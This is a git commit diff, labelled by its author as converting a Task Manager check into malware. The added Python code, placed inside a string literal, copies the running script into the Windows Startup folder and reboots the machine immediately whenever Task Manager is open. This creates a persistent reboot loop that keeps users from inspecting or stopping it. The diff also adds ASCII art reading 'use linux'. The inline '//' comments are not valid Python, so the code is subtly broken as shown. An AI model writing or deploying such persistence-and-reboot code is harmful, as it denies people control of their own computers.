ef9f389db095e724d50718f6473cc7504cb203f9
Caliduseb <46005624+Caliduseb@users.noreply.github.com>
2019-09-22 01:40:22 +0200

    converted TaskmanagerCheck to Malware

--- checkForTaskmanager.py
+++ checkForTaskmanager.py
@@ -5,3 +5,27 @@ def running():
     if os.system("tasklist /FI \"IMAGENAME eq taskmgr.exe\" 2>NUL | find /I /N \"taskmgr.exe\">NUL") == 0:
         return True
     return False
+
+
+"""
+
+if running():
+    os.system(str("copy " + sys.argv[0] + " \"" + home +                                    //copy in autostart
+            "/AppData\Roaming/Microsoft/Windows/Start Menu/Programs/Startup\""))
+    os.system("shutdown -r -t 0")                                                          //reboot         
+
+
+                                     __  __                               
+                                    |  \|  \                              
+ __    __   _______   ______        | $$ \$$ _______   __    __  __    __ 
+|  \  |  \ /       \ /      \       | $$|  \|       \ |  \  |  \|  \  /  \
+| $$  | $$|  $$$$$$$|  $$$$$$\      | $$| $$| $$$$$$$\| $$  | $$ \$$\/  $$
+| $$  | $$ \$$    \ | $$    $$      | $$| $$| $$  | $$| $$  | $$  >$$  $$ 
+| $$__/ $$ _\$$$$$$\| $$$$$$$$      | $$| $$| $$  | $$| $$__/ $$ /  $$$$\ 
+ \$$    $$|       $$ \$$     \      | $$| $$| $$  | $$ \$$    $$|  $$ \$$\
+  \$$$$$$  \$$$$$$$   \$$$$$$$       \$$ \$$ \$$   \$$  \$$$$$$  \$$   \$$
+                                                                          
+                                                                          
+                                                                          
+
+"""
